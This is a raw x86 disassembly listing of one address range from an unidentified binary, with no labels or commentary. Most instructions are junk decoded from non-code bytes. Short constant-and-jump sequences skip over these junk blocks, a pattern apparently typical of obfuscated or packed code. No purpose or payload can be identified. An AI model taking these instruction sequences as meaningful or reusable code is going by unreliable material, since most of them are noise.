  422bff:	sbb    eax,0x7924bd98
  422c04:	inc    ebp
  422c05:	stos   DWORD PTR es:[edi],eax
  422c06:	arpl   WORD PTR [ebp+0x6d56702b],cx
  422c0c:	aas    
  422c0d:	xchg   esi,eax
  422c0e:	xchg   esp,eax
  422c0f:	add    DWORD PTR [eax+ebx*1],eax
  422c12:	(bad)  
  422c13:	stc    
  422c14:	adc    BYTE PTR [edx],al
  422c16:	in     eax,0x12
  422c18:	aam    0x35
  422c1a:	or     ebx,DWORD PTR [edx]
  422c1c:	pushf  
  422c1d:	fdivr  st,st(2)
  422c1f:	ficomp DWORD PTR [ecx-0x5a]
  422c22:	fnsave [eax-0x3da73b93]
  422c28:	push   edi
  422c29:	popa   
  422c2a:	aaa    
  422c2b:	iret   
  422c2c:	cmp    eax,0x66c8bbe2
  422c31:	adc    edi,DWORD PTR [edx+0x64e946b6]
  422c37:	push   edx
  422c38:	and    esi,DWORD PTR [edx]
  422c3a:	inc    esi
  422c3b:	out    0xd8,eax
  422c3d:	dec    esi
  422c3e:	stos   BYTE PTR es:[edi],al
  422c3f:	(bad)  
  422c41:	jns    0x422bd0
  422c43:	dec    esp
  422c44:	icebp  
  422c45:	mov    ch,0x84
  422c47:	lods   eax,DWORD PTR ds:[esi]
  422c48:	mov    bl,0xec
  422c4a:	xchg   esp,eax
  422c4b:	lds    ebx,FWORD PTR ds:0xe18c4e1e
  422c51:	ss mov esi,0x7e958c8e
  422c57:	ss push ebp
  422c59:	outs   dx,BYTE PTR ds:[esi]
  422c5a:	ins    DWORD PTR es:[edi],dx
  422c5b:	stc    
  422c5c:	(bad)  
  422c5d:	sbb    edi,ebx
  422c5f:	in     al,0x6
  422c61:	aaa    
  422c62:	mov    BYTE PTR [esi+0x2e],bh
  422c65:	aaa    
  422c66:	push   ds
  422c67:	(bad)  
  422c68:	xor    BYTE PTR [esi+eax*1],bh
  422c6b:	xchg   edx,eax
  422c6c:	nop
  422c6d:	jno    0x422ca5
  422c6f:	cld    
  422c70:	ror    BYTE PTR [ebx-0x566be172],cl
  422c76:	(bad)  
  422c77:	mov    DWORD PTR [ebp-0x24],0xa4b
  422c7e:	mov    eax,DWORD PTR [ebp-0x24]
  422c81:	jmp    0x422d4f
  422c86:	or     al,0xd9
  422c88:	aam    0x44
  422c8a:	aad    0x4d
  422c8c:	pushf  
  422c8d:	fnop   
  422c8f:	out    dx,al
  422c90:	xchg   ebx,eax
  422c91:	sbb    al,0xe3
  422c93:	mov    dh,0xc1
  422c95:	ret    
  422c96:	push   esi
  422c97:	cwde   
  422c98:	add    DWORD PTR [eax],eax
  422c9a:	mov    cl,0x0
  422c9c:	add    BYTE PTR [eax],al
  422c9e:	les    edi,FWORD PTR [ecx]
  422ca0:	jnp    0x422c6d
  422ca2:	inc    esi
  422ca3:	call   0x675b:0x394e2276
  422caa:	call   0x31e5f883
  422caf:	(bad)  
  422cb0:	and    eax,0x9839ffe3
  422cb5:	retf   0x4c3e
  422cb8:	add    eax,0xecf5340b
  422cbd:	cdq    
  422cbe:	imul   ebx,DWORD PTR [eax-0x4a],0x65ab4007
  422cc5:	push   ebp
  422cc6:	push   ecx
  422cc7:	mov    esp,0x771ac62e
  422ccc:	mov    ch,0x74
  422cce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ccf:	push   cs
  422cd0:	popa   
  422cd1:	call   edi
  422cd3:	push   cx
  422cd5:	cmp    eax,edi
  422cd7:	repnz push 0x912bf747
  422cdd:	aaa    
  422cde:	mov    ah,0xb5
  422ce0:	out    0x5a,al
  422ce2:	std    
  422ce3:	pop    esi
  422ce4:	sahf   
  422ce5:	das    
  422ce6:	mov    DWORD PTR [edx-0x2a668b5a],ecx
  422cec:	mov    ebx,0xd008968f
  422cf1:	ins    DWORD PTR es:[edi],dx
  422cf2:	fs dec esp
  422cf4:	xor    DWORD PTR [eax-0x16953d44],ecx
  422cfa:	mov    edx,0x41b5b808
  422cff:	fistp  QWORD PTR [ecx-0x4d6af715]
  422d05:	pushf  
  422d06:	mov    edx,0xe9e49a8a
  422d0b:	stos   DWORD PTR es:[edi],eax
  422d0c:	cmp    dh,dl
  422d0e:	std    
  422d0f:	dec    ebp
  422d10:	(bad)  
  422d11:	int3   
  422d12:	sbb    eax,0x366440eb
  422d17:	or     BYTE PTR [eax],cl
  422d19:	ffreep st(7)
  422d1b:	sbb    al,0x8d
  422d1d:	xor    DWORD PTR [ecx],esi
  422d1f:	jmp    0x3f705a43
  422d24:	cmp    DWORD PTR [ebx+0x20ea3856],ebx
  422d2a:	das    
  422d2b:	(bad)  
  422d2c:	dec    esi
  422d2d:	leave  
  422d2e:	sti    
  422d2f:	lock shl edi,cl
  422d32:	jl     0x422cba
  422d34:	aas    
  422d35:	hlt    
  422d36:	adc    esi,ebx
  422d38:	sbb    eax,0xad689723
  422d3d:	ins    BYTE PTR es:[edi],dx
  422d3e:	sub    eax,0xc9714f79
  422d43:	jns    0x422d06
  422d45:	das    
  422d46:	pop    es
  422d47:	adc    al,0x16
  422d49:	fs xor cl,bh
  422d4c:	pop    esi
  422d4d:	push   edx
  422d4e:	retf   
  422d4f:	mov    edx,DWORD PTR [ebp-0x8]
  422d52:	or     eax,0x601
  422d57:	xor    eax,0xffffe0ef
  422d5c:	and    eax,edx
  422d5e:	jmp    0x422e2c
  422d63:	dec    esp
  422d64:	imul   ecx,DWORD PTR fs:[ebx+ebp*2+0x41e4ef8f],0x4f
  422d6d:	pop    eax
  422d6e:	shl    DWORD PTR [si+0xb],1
  422d72:	mov    esp,0x19907
  422d77:	mov    cl,0x0
  422d79:	add    BYTE PTR [eax],al
  422d7b:	call   0x9dc7:0xb7d20ab4
  422d82:	nop
  422d83:	hlt    
  422d84:	daa    
  422d85:	pusha  
  422d86:	mov    esi,DWORD PTR [eax+0x6171e089]
  422d8c:	pop    edi
  422d8d:	mov    ds:0x7921372b,al
  422d92:	das    
  422d93:	mov    ah,0x2b
  422d95:	push   ds
  422d96:	jae    0x422e12
  422d98:	xor    bl,dl
  422d9a:	cmp    edx,DWORD PTR [edi-0x24d43545]
  422da0:	test   BYTE PTR ds:0xd0003778,bh
  422da6:	adc    al,0xd6
  422da8:	test   DWORD PTR [ecx-0x15aacad7],eax
  422dae:	les    ecx,FWORD PTR [ecx]
  422db0:	out    0x4,al
  422db2:	jge    0x422d64
  422db4:	out    0x55,al
  422db6:	int    0xbc
  422db8:	mov    ebx,esi
  422dba:	mov    gs,ebx
  422dbc:	xor    eax,0xe6fef682
  422dc1:	mov    BYTE PTR [ecx+0x11ef1416],bl
  422dc7:	imul   esp
  422dc9:	push   ss
  422dca:	xchg   edi,eax
  422dcb:	and    ebx,0xba3a9368
  422dd1:	shl    DWORD PTR [ebx-0x5dad2e0],0x74
  422dd8:	lds    eax,FWORD PTR [eax]
  422dda:	test   eax,0x4f77908a
  422ddf:	popf   
  422de0:	sub    bh,BYTE PTR [edi]
  422de2:	bound  eax,QWORD PTR [ecx-0x279f2fea]
  422de8:	mov    dl,0x4b
  422dea:	test   DWORD PTR [esi+ebx*1],0xbc9f8b91
  422df1:	inc    ecx
  422df2:	mov    dl,0x41
  422df4:	test   eax,0xb7f5afd5
  422df9:	sub    al,0x65
  422dfb:	sub    BYTE PTR [ebp-0x10],0x82
  422dff:	cmp    ah,BYTE PTR [ecx]
  422e01:	lods   al,BYTE PTR ds:[esi]
  422e02:	aam    0x52
  422e04:	push   edx
  422e05:	in     eax,0x64
  422e07:	jns    0x422e13
  422e09:	imul   edi,DWORD PTR [edx],0xffffffb5
  422e0c:	jmp    0x422e87
  422e0e:	pop    eax
  422e0f:	sub    esp,ebp
  422e11:	mov    ah,0x65
  422e13:	jno    0x422e0c
  422e15:	and    eax,0x92b84d46
  422e1a:	inc    ecx
  422e1b:	push   0x25
  422e1d:	out    0xeb,al
  422e1f:	inc    ebx
  422e20:	arpl   WORD PTR [esi+0x32689bd2],dx
  422e26:	mov    al,0x6c
  422e28:	hlt    
  422e29:	cmp    bl,ch
  422e2b:	or     ah,BYTE PTR ds:0x5f19
  422e31:	mov    DWORD PTR [ebp-0xc],eax
  422e34:	mov    DWORD PTR [ebp-0x8],ebx
  422e37:	mov    DWORD PTR [ebp-0x24],0x47ff
  422e3e:	mov    eax,DWORD PTR [ebp-0x24]
  422e41:	mov    ebx,DWORD PTR [ebp-0x8]
  422e44:	and    eax,edi
  422e46:	jmp    0x422f14
  422e4b:	jb     0x422eac
  422e4d:	jnp    0x422e2a
  422e4f:	jg     0x422e50
  422e51:	repnz jmp FWORD PTR [edx-0x79]
  422e55:	shl    ah,cl
  422e57:	pushf  
  422e58:	sub    BYTE PTR [ebx],dl
  422e5a:	(bad)  
  422e5c:	cdq    
  422e5d:	add    DWORD PTR [eax],eax
  422e5f:	mov    cl,0x0
  422e61:	add    BYTE PTR [eax],al
  422e63:	(bad)  
  422e65:	dec    esp
  422e66:	scas   eax,DWORD PTR es:[edi]
  422e67:	push   edx
  422e68:	jo     0x422e06
  422e6a:	ins    BYTE PTR es:[edi],dx
  422e6b:	aaa    
  422e6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e6d:	mov    bl,0xbf
  422e6f:	ins    BYTE PTR es:[edi],dx
  422e70:	and    edi,DWORD PTR [ebp+0x62]
  422e73:	push   ds
  422e74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e75:	mov    cs,edx
  422e77:	bound  edi,QWORD PTR ds:0xede5e5c0
  422e7d:	popa   
  422e7e:	(bad)  [ecx+0x1f119646]
  422e84:	mov    BYTE PTR [ecx-0x3e494d3b],cl
  422e8a:	push   0x89fd4958
  422e8f:	mov    cl,0x25
  422e91:	or     al,0x6d
  422e93:	push   edx
  422e94:	retf   
  422e95:	ret    0xce21
  422e98:	ins    BYTE PTR es:[edi],dx
  422e99:	scas   eax,DWORD PTR es:[edi]
  422e9a:	(bad)  
  422e9b:	pop    esp
  422e9c:	lock or DWORD PTR [ebx+eax*1],0x1
  422ea1:	lock ja 0x422e30
  422ea4:	push   es
  422ea5:	xchg   DWORD PTR [eax+0x2a62088e],eax
  422eab:	fisub  WORD PTR [esi+ecx*1+0x5e]
  422eaf:	pop    esp
  422eb0:	test   DWORD PTR [ebx-0x25],esi
  422eb3:	mov    eax,ds:0xbf67369
  422eb8:	(bad)  
  422eb9:	mov    ebp,0xe5cad386
  422ebe:	stos   BYTE PTR es:[edi],al
  422ebf:	in     al,dx
  422ec0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ec1:	xchg   ebx,eax
  422ec2:	mov    DWORD PTR [ebp-0x6f8a69dc],eax
  422ec8:	je     0x422f00
  422eca:	jmp    0x6fe7ffe5
  422ecf:	add    ecx,DWORD PTR [ebp+0x1]
  422ed2:	xchg   ebx,eax
  422ed3:	mov    edi,0xc56542ce
  422ed8:	cmc    
  422ed9:	nop
  422eda:	cmc    
  422edb:	pop    edx
  422edc:	adc    al,0xef
  422ede:	jle    0x422ece
  422ee0:	xlat   BYTE PTR ds:[ebx]
  422ee1:	cmp    ebx,ebx
  422ee3:	dec    ebp
  422ee4:	int    0xab
  422ee6:	in     eax,dx
  422ee7:	sub    DWORD PTR [eax],ecx
  422ee9:	adc    eax,DWORD PTR [ebx+0xa]
  422eec:	xor    eax,0x1bfe783
  422ef1:	mov    ds:0x28e365bb,al
  422ef6:	and    BYTE PTR [ebx],ah
  422ef8:	mov    edi,0x97b7571b
  422efd:	pop    esi
  422efe:	mov    edi,0x969bb986
  422f03:	aam    0x2a
  422f05:	jbe    0x422ed1
  422f07:	inc    esp
  422f08:	shl    BYTE PTR [eax],0xf9
  422f0b:	adc    eax,0xe301d73e
  422f10:	mov    eax,0x3348c279
  422f15:	shl    BYTE PTR [ebx],cl
  422f17:	shl    edi,0xf3
  422f1a:	mov    edx,DWORD PTR [ebp-0xc]
  422f1d:	add    BYTE PTR [ebp-0x1],0x5e
  422f21:	cmp    eax,edx
  422f23:	jmp    0x422ff1
  422f28:	imul   ebx,DWORD PTR [ebx-0x23],0xc
  422f2c:	std    
  422f2d:	mov    ?,ebx
  422f2f:	jg     0x422f31
  422f31:	mov    esp,0xae7dcde1
  422f36:	popf   
  422f37:	imul   ebp,DWORD PTR [ecx-0x66],0xb10001
  422f3e:	add    BYTE PTR [eax],al
  422f40:	push   0x72
  422f42:	jo     0x422ee3
  422f44:	imul   DWORD PTR [ebp+esi*1+0x3b]
  422f48:	cdq    
  422f49:	mov    BYTE PTR [eax-0x66ac5c5b],ch
  422f4f:	das    
  422f50:	daa    
  422f51:	ficomp DWORD PTR ds:0xa1eebfc7
  422f57:	int3   
  422f58:	add    DWORD PTR [edi+eax*4+0x4c5bff57],ecx
  422f5f:	iret   
  422f60:	jmp    0x3925b860
  422f65:	ficomp DWORD PTR [edi-0x32ad5b07]
  422f6b:	push   0x921ea143
  422f70:	inc    eax
  422f71:	fcmovne st,st(0)
  422f73:	add    BYTE PTR [ebx+eiz*4-0x76426014],cl
  422f7a:	fdiv   QWORD PTR [eax+ebp*2]
  422f7d:	add    al,0xdd
  422f7f:	mov    dh,bh
  422f81:	mov    ds:0x12b39749,al
  422f86:	test   DWORD PTR [ebx-0x67],ecx
  422f89:	lods   eax,DWORD PTR ds:[esi]
  422f8a:	lock or ebx,edx
  422f8d:	aam    0x34
  422f8f:	fldcw  WORD PTR [ebx+0x40415f22]
  422f95:	push   es
  422f96:	sub    BYTE PTR [ebx-0x28],bl
  422f99:	sub    bl,bh
  422f9b:	in     al,0x7c
  422f9d:	sahf   
  422f9e:	lods   eax,DWORD PTR ds:[esi]
  422fa0:	sub    eax,0x61aae656
  422fa5:	scas   eax,DWORD PTR es:[edi]
  422fa6:	cmp    cl,BYTE PTR [ecx+0x58]
  422fa9:	ins    BYTE PTR es:[edi],dx
  422faa:	mov    ch,0x2a
  422fac:	arpl   WORD PTR [edi-0x24],bp
  422faf:	nop
  422fb0:	add    eax,0x31cb7b1b
  422fb5:	jb     0x423004
  422fb7:	cmp    dh,BYTE PTR [ebx+0x6d]
  422fba:	pop    ds
  422fbb:	nop
  422fbc:	int    0xc4
  422fbe:	fmul   DWORD PTR [ebp+0xab4f4c0]
  422fc4:	push   ds
  422fc5:	test   DWORD PTR [edi+0x9],ecx
  422fc8:	push   0xf45eb302
  422fcd:	adc    dl,BYTE PTR ds:0xa4cebe34
  422fd3:	jp     0x422f5b
  422fd5:	sahf   
  422fd6:	iret   
  422fd7:	mov    eax,ds:0x4317bffd
  422fdc:	mov    BYTE PTR [edx-0x77458b97],ah
  422fe2:	enter  0x2707,0x86
  422fe6:	and    al,dl
  422fe8:	jmp    0xfbd726d5
  422fed:	bound  esi,QWORD PTR [ecx+eax*8+0x1c830fd0]
  422ff4:	add    eax,0x45c70000
  422ff9:	in     al,dx
  422ffa:	loop   0x423049
  422ffc:	add    BYTE PTR [eax],al
  422ffe:	mov    DWORD PTR [ebp-0x18],0x3726
  423005:	jmp    0x4230d3
  42300a:	or     BYTE PTR [edi-0x878bd],bh
  423010:	int3   
  423011:	mov    edi,0x383f5c99
  423016:	in     eax,0xac
  423018:	popf   
  423019:	ficomp WORD PTR [edx]
  42301b:	fwait
  42301c:	add    DWORD PTR [eax],eax
  42301e:	mov    cl,0x0
  423020:	add    BYTE PTR [eax],al
  423022:	fisttp QWORD PTR es:[bx+0x3d48]
  423028:	out    dx,eax
  423029:	mov    cl,ah
  42302b:	xchg   ecx,eax
  42302c:	pop    edx
  42302d:	mov    ebx,0xfbd9f53f
  423032:	cmp    al,0x64
  423034:	in     al,0x71
  423036:	mov    bl,0x4f
  423038:	inc    esi
  423039:	dec    edi
  42303a:	jns    0x42309b
  42303c:	cmp    dl,dh
  42303e:	sub    DWORD PTR [eax+0x193a0377],eax
  423044:	ficomp WORD PTR [ebp+0x22]
  423047:	sub    BYTE PTR [eax+0x5b00727c],bl
  42304d:	xor    eax,0x376c9b6a
  423052:	or     edx,eax
  423054:	mov    gs,WORD PTR [esi+0x70]
  423057:	xchg   edx,eax
  423058:	leave  
  423059:	pop    es
  42305a:	je     0x42309c
  42305c:	call   0xc04f:0x64b56885
  423063:	inc    ebx
  423064:	mov    edi,0x1575e302
  423069:	retf   
  42306a:	mov    ebp,0x33054f7
  42306f:	mov    esi,0x7b1e11d8
  423074:	lock pop ds
  423076:	adc    edx,DWORD PTR [edx-0x16]
  423079:	xchg   esi,eax
  42307a:	or     esp,DWORD PTR [eax-0x29]
  42307d:	jp     0x423034
  42307f:	cs mov ah,0xf0
  423082:	nop
  423083:	fcmove st,st(0)
  423085:	aas    
  423086:	push   ebp
  423087:	sub    al,0x21
  423089:	inc    esi
  42308a:	hlt    
  42308b:	shl    ch,0x68
  42308e:	in     al,0x79
  423090:	icebp  
  423091:	dec    edx
  423092:	scas   al,BYTE PTR es:[edi]
  423093:	jnp    0x423103
  423095:	fxtract 
  423097:	or     esp,esp
  423099:	dec    eax
  42309a:	and    al,0xf7
  42309c:	ss inc edi
  42309e:	scas   eax,DWORD PTR es:[edi]
  42309f:	add    ch,ah
  4230a1:	jae    0x4230d3
  4230a3:	and    BYTE PTR [ebx],dl
  4230a5:	xchg   ecx,eax
  4230a6:	hlt    
  4230a7:	icebp  
  4230a8:	push   ds
  4230a9:	jne    0x423108
  4230ab:	pop    eax
  4230ac:	and    ah,BYTE PTR [ecx+0x15]
  4230af:	ins    BYTE PTR es:[edi],dx
  4230b0:	in     al,dx
  4230b1:	stc    
  4230b2:	jecxz  0x423098
  4230b4:	and    al,0x21
  4230b6:	mov    BYTE PTR [ecx+0x58],dh
  4230b9:	mov    DWORD PTR [ebx],esi
  4230bb:	enter  0xb7da,0xb1
  4230bf:	push   edi
  4230c0:	add    al,0xb9
  4230c2:	or     al,0xc2
  4230c4:	pop    ebx
  4230c5:	stc    
  4230c6:	das    
  4230c7:	test   BYTE PTR [eax-0x11],dh
  4230ca:	stc    
  4230cb:	repnz les edi,FWORD PTR [eax+0x8]
  4230cf:	push   ebx
  4230d0:	mov    ss,WORD PTR [esp+edx*1+0x39f445c7]
  4230d7:	add    BYTE PTR cs:[eax],al
  4230da:	jmp    0x4231a8
  4230df:	xchg   esi,eax
  4230e0:	not    cl
  4230e2:	fyl2x  
  4230e4:	call   FWORD PTR [esi+0x204ca0ff]
  4230ea:	sbb    al,0x14
  4230ec:	dec    esp
  4230ed:	fistp  WORD PTR [edi+0x19bcb]
  4230f3:	mov    cl,0x0
  4230f5:	add    BYTE PTR [eax],al
  4230f7:	not    BYTE PTR ds:0x37eae772
  4230fd:	into   
  4230fe:	js     0x423081
  423100:	pop    esp
  423101:	retf   0xbfdd
  423104:	dec    ecx
  423105:	push   ebx
  423106:	cmp    ch,al
  423108:	mov    ch,0x4a
  42310a:	or     BYTE PTR [ebp+ebx*4-0x143cf03a],0x1b
  423112:	push   esi
  423113:	lahf   
  423114:	mov    ds:0x47646c64,eax
  423119:	dec    esi
  42311a:	push   cs
  42311b:	xor    bl,BYTE PTR ss:[edx]
  42311e:	xor    al,0x38
  423120:	jl     0x42319e
  423122:	mov    al,ds:0x20ed8bd
  423127:	push   cs
  423128:	or     eax,0x1ae14750
  42312d:	cdq    
  42312e:	(bad)  
  42312f:	and    DWORD PTR [ecx-0x3de30e8b],esi
  423135:	add    BYTE PTR [ecx-0x68],0x27
  423139:	test   ebp,ebx
  42313b:	jp     0x42318b
  42313d:	test   al,0x57
  42313f:	and    al,bh
  423141:	xchg   ebx,eax
  423142:	jp     0x4231b2
  423144:	or     bl,BYTE PTR es:[edx]
  423147:	les    ecx,FWORD PTR [ebx-0x4c]
  42314a:	std    
  42314b:	ds push edi
  42314d:	pop    ebp
  42314e:	jns    0x423146
  423150:	inc    ecx
  423151:	mov    al,0xae
  423154:	cld    
  423155:	or     eax,edi
  423157:	jmp    0x4938:0x20c72bdc
  42315e:	adc    cl,ch
  423160:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423161:	gs inc ebp
  423163:	stc    
  423164:	cmovle esi,DWORD PTR [esi-0x5f3a89eb]
  42316b:	jno    0x4231b1
  42316d:	cld    
  42316e:	aas    
  42316f:	(bad)  
  423170:	lock je 0x423164
  423173:	imul   edx,DWORD PTR [edx+ebp*2+0x655e0460],0xcd7554
  42317e:	(bad)  
  42317f:	mov    ds:0x2308a346,eax
  423184:	retf   0xdafe
  423187:	sbb    BYTE PTR [edi+0x7b3c93d],bl
  42318d:	clc    
  42318e:	pop    ebp
  42318f:	in     eax,dx
  423190:	xlat   BYTE PTR ds:[ebx]
  423191:	xchg   BYTE PTR [edx+ecx*4],bl
  423194:	add    eax,0x27cd47a7
  423199:	fmul   st(5),st
  42319b:	loope  0x423147
  42319d:	call   0xe990c96b
  4231a2:	repz sbb BYTE PTR ss:[ebp+0x45c73a76],dl
  4231aa:	clc    
  4231ab:	push   es
  4231ac:	jl     0x4231ae
  4231ae:	add    bh,al
  4231b0:	inc    ebp
  4231b1:	fmul   QWORD PTR [ecx]
  4231b3:	imul   eax,DWORD PTR [eax],0xdc458b00
  4231b9:	mov    edx,DWORD PTR [ebp-0x8]
  4231bc:	jmp    0x42328a
  4231c1:	shl    BYTE PTR [ebp+0x3eff34bb],cl
  4231c7:	fcomip st,st(7)
  4231c9:	mov    ebp,0x184eafc5
  4231ce:	or     al,0xa1
  4231d0:	or     eax,0x19c7c
  4231d5:	mov    cl,0x0
  4231d7:	add    BYTE PTR [eax],al
  4231d9:	dec    edi
  4231da:	pop    edi
  4231db:	cs lock and dl,cl
  4231df:	xchg   esi,eax
  4231e0:	mov    WORD PTR [ecx-0x64a39add],ds
  4231e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4231e7:	scas   eax,DWORD PTR es:[edi]
  4231e8:	in     al,dx
  4231e9:	inc    eax
  4231ea:	sub    eax,0x36ea3eb
  4231ef:	nop
  4231f0:	dec    edx
  4231f1:	jbe    0x4231b8
  4231f3:	mov    ah,0x3b
  4231f5:	and    esp,DWORD PTR [edi-0x33]
  4231f8:	or     BYTE PTR [ebp+ebp*2+0x1e],dl
  4231fc:	test   DWORD PTR [ebp+0x5ad86136],ecx
  423202:	lds    ecx,FWORD PTR [ecx]
  423204:	pop    ebp
  423205:	arpl   WORD PTR [ebx+ebx*2],si
  423208:	data16 sub al,0x2a
  42320b:	pop    es
  42320c:	push   esi
  42320d:	imul   BYTE PTR [ebx]
  42320f:	mov    al,ds:0x57e328b0
  423214:	mov    ch,0x9c
  423216:	fs mov dl,0xa1
  423219:	jl     0x4231b1
  42321b:	les    ecx,FWORD PTR [edx+ecx*1]
  42321e:	xchg   edi,eax
  42321f:	sbb    ch,BYTE PTR [edx]
  423221:	inc    eax
  423222:	lahf   
  423223:	retf   
  423224:	xor    al,0xa7
  423226:	fdivp  st(0),st
  423228:	repnz push cs
  42322a:	mov    cl,0x6e
  42322c:	(bad)  
  42322d:	push   ds
  42322e:	adc    eax,0x8dec6ee1
  423233:	push   0xbf6dc2ed
  423238:	xchg   edi,eax
  423239:	push   esi
  42323a:	mov    ebp,0x651b7145
  42323f:	dec    esi
  423240:	sar    BYTE PTR [edx],cl
  423242:	jmp    0x423236
  423244:	xor    dl,dl
  423246:	mov    edi,0x149a6ebf
  42324b:	sar    BYTE PTR [edx-0x913dab0],cl
  423251:	jge    0x42325c
  423253:	or     eax,0x672b2e12
  423258:	inc    esp
  423259:	mov    BYTE PTR [edx-0x70],dh
  42325c:	stc    
  42325d:	cmp    esp,DWORD PTR [edx+ebp*2]
  423260:	xchg   edx,eax
  423261:	dec    eax
  423262:	lods   al,BYTE PTR ds:[esi]
  423263:	push   eax
  423264:	jbe    0x423222
  423266:	and    DWORD PTR [ebx],0x40d767da
  42326c:	ret    0xf851
  42326f:	bswap  esi
  423271:	jne    0x4231fe
  423273:	or     bl,BYTE PTR [edx+ebp*1]
  423276:	stos   BYTE PTR es:[edi],al
  423277:	push   es
  423278:	dec    edi
  423279:	mov    ah,0xc1
  42327b:	ins    DWORD PTR es:[edi],dx
  42327c:	int3   
  42327d:	xchg   ebx,eax
  42327e:	in     eax,0xd4
  423280:	sbb    bh,BYTE PTR [edi]
  423282:	push   ss
  423283:	(bad)  
  423284:	jae    0x423240
  423286:	xor    al,0x9e
  423288:	in     eax,0x6d
  42328a:	sub    edx,eax
  42328c:	mov    eax,DWORD PTR [ebp-0xc]
  42328f:	xor    edx,eax
  423291:	mov    eax,DWORD PTR [ebp-0x18]
  423294:	sub    edx,0x2897
  42329a:	imul   edx,eax
  42329d:	jmp    0x42336b
  4232a2:	lock jb 0x4232fd
  4232a5:	ret    
  4232a6:	(bad)  
  4232a8:	sti    
  4232a9:	jae    0x4232af
  4232ab:	push   0xd41cdeb9
  4232b0:	xchg   ecx,eax
  4232b1:	dec    esi
  4232b2:	sub    eax,0xb100019d
  4232b7:	add    BYTE PTR [eax],al
  4232b9:	add    dl,bh
  4232bb:	and    esp,DWORD PTR [ebx-0x7c]
  4232be:	ret    
  4232bf:	sbb    al,0x76
  4232c1:	int    0x6
  4232c3:	sbb    bl,cl
  4232c5:	xor    eax,0x1a89c8f4
  4232ca:	jp     0x423301
  4232cc:	and    eax,0xc445987
  4232d1:	add    DWORD PTR [esi+0x2e],ecx
  4232d4:	(bad)  
  4232d5:	mov    bh,0x1f
  4232d7:	addr16 jo 0x423322
  4232da:	gs clc 
  4232dc:	sbb    ecx,eax
  4232de:	inc    ecx
  4232df:	jge    0x42327e
  4232e1:	stos   BYTE PTR es:[edi],al
  4232e2:	jp     0x4232c6
  4232e4:	jb     0x423289
  4232e6:	dec    ebp
  4232e7:	loop   0x423272
  4232e9:	cwde   
  4232ea:	or     esp,DWORD PTR [edx-0x2]
  4232ed:	sbb    dl,BYTE PTR ds:0x97a4939b
  4232f3:	setnp  BYTE PTR [edi+0x18]
  4232f7:	out    0xf6,eax
  4232f9:	fldenv [edx+esi*2-0x1e]
  4232fd:	pop    ds
  4232fe:	and    al,0xa0
  423300:	xor    eax,0x589cd626
  423305:	in     eax,0xc4
  423307:	jle    0x42329e
  423309:	in     al,dx
  42330a:	into   
  42330b:	mov    bh,0x9b
  42330d:	fistp  WORD PTR [ebx+0x2]
  423310:	cmc    
  423311:	xchg   ebx,eax
  423312:	mov    al,0x9a
  423314:	or     dh,bl
  423316:	dec    edx
  423317:	mov    ds:0x146d906d,eax
  42331c:	dec    esi
  42331d:	mov    edi,ss
  42331f:	xchg   ebp,eax
  423320:	mov    ebx,0xf19e9f33
  423325:	shl    DWORD PTR [edi],cl
  423327:	(bad)  
  423329:	sub    edx,esi
  42332b:	push   ebp
  42332c:	ins    BYTE PTR es:[edi],dx
  42332d:	and    al,0x23
  42332f:	fisub  WORD PTR [ebx+0x7d]
  423332:	mov    bh,0xbc
  423334:	xor    eax,0x4aebd2cd
  423339:	mov    esi,0xc2f7c620
  42333e:	push   ebx
  42333f:	(bad)  [eax-0x134fb44e]
  423345:	lods   al,BYTE PTR ds:[esi]
  423346:	push   edi
  423347:	inc    ebp
  423348:	or     DWORD PTR [eax],edx
  42334a:	pop    ebx
  42334b:	cli    
  42334c:	mov    dl,0x15
  42334e:	sbb    eax,0xb
  423351:	pop    ebp
  423352:	and    eax,0xd7b6dc1b
  423357:	push   es
  423358:	xchg   al,ah
  42335a:	cmp    edx,DWORD PTR [esi+0x55]
  42335d:	jge    0x4232f3
  42335f:	gs retf 0x10e8
  423363:	(bad)  
  423364:	cmp    dl,BYTE PTR [edi-0x1e2a678f]
  42336a:	fwait
  42336b:	mov    eax,DWORD PTR [ebp-0x14]
  42336e:	and    edx,eax
  423370:	jmp    0x42343e
  423375:	lahf   
  423376:	mov    ch,0xb6
  423378:	sar    DWORD PTR [esi-0x3900002d],1
  42337e:	popf   
  42337f:	push   esi
  423380:	pop    edi
  423381:	jno    0x423388
  423383:	pop    edi
  423384:	ficomp WORD PTR [di+0x1]
  423389:	mov    cl,0x0
  42338b:	add    BYTE PTR [eax],al
  42338d:	imul   ecx,DWORD PTR [ebp+0x7af2b52f],0xa4fe9539
  423397:	js     0x4233c0
  423399:	sahf   
  42339a:	mov    esp,ss
  42339c:	sti    
  42339d:	out    dx,al
  42339e:	hlt    
  42339f:	ins    BYTE PTR es:[edi],dx
  4233a0:	leave  
  4233a1:	bound  ecx,QWORD PTR [edx]
  4233a3:	(bad)  
  4233a4:	mov    ds:0xcdfb52eb,al
  4233a9:	mov    ecx,0xd62f49dd
  4233ae:	loopne 0x4233b9
  4233b0:	xor    ecx,0x24
  4233b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4233b4:	or     edi,edi
  4233b6:	mov    ?,WORD PTR [ecx+0x10]
  4233b9:	add    ecx,eax
  4233bb:	push   0xffffff89
  4233bd:	xor    DWORD PTR [edi],ebx
  4233bf:	inc    ecx
  4233c0:	in     eax,dx
  4233c1:	addr16 je 0x42341f
  4233c4:	mov    bl,BYTE PTR [ebp-0x5f]
  4233c7:	imul   ecx,DWORD PTR [ecx-0x3e188201],0x36
  4233ce:	pushf  
  4233cf:	scas   eax,DWORD PTR es:[edi]
  4233d0:	enter  0x82d,0xd8
  4233d4:	cwde   
  4233d5:	or     ebp,eax
  4233d7:	lds    ebp,FWORD PTR [ebx]
  4233d9:	stos   DWORD PTR es:[edi],eax
  4233da:	cwde   
  4233db:	(bad)  
  4233dc:	fucomp st(0)
  4233de:	pop    edi
  4233df:	xchg   ecx,eax
  4233e0:	imul   dl
  4233e2:	cmp    al,bh
  4233e4:	fwait
  4233e5:	cli    
  4233e6:	jae    0x42341e
  4233e8:	xor    eax,0xa4d93838
  4233ed:	nop
  4233ee:	mov    eax,ds:0x5ff263f7
  4233f3:	xor    ebp,esp
  4233f5:	xlat   BYTE PTR ss:[ebx]
